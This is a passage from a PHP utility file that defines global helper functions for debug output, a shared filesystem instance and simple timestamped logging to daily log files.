        }
    }

    if (!function_exists('debug')) {
        function debug($var, $html = true)
        {
            if (is_null($var) ) {
                return '<span class="null-value">[NULL]</span>';
            }
            $out = '';
            switch ($var) {
                case empty($var):
                    $out = '[empty value]';
                    break;

                case Arrays::is($var):
                    $out = var_export($var, true);
                    break;

                case is_object($var):
                    $out = var_export($var, true);
                    break;

                case is_string($var):
                    $out = $var;
                    break;

                default:
                    $out = var_export($var, true);
                    break;
            }
            if (true === $html) {
              $out = "<pre>\n" . $out . "</pre>";
            }
            return $out;
        }
    }

    if (!function_exists('fs')) {
        function fs()
        {
            static $i;
            if (is_null($i)) {
                $i = new Filesystem;
            }
            return $i;
        }
    }
    if (!function_exists('ThinLog')) {
        function ThinLog($message, $logFile = null, $type = 'info')
        {
            if (null === $logFile) {
                $logFile = LOGS_PATH . DS . date('Y-m-d') . '.log';
            } else {
                if (false === File::exists($logFile)) {
                    File::create($logFile);
                }
            }
            File::append($logFile, date('Y-m-d H:i:s') . "\t" . Inflector::upper($type) . "\t$message\n");
        }
    }
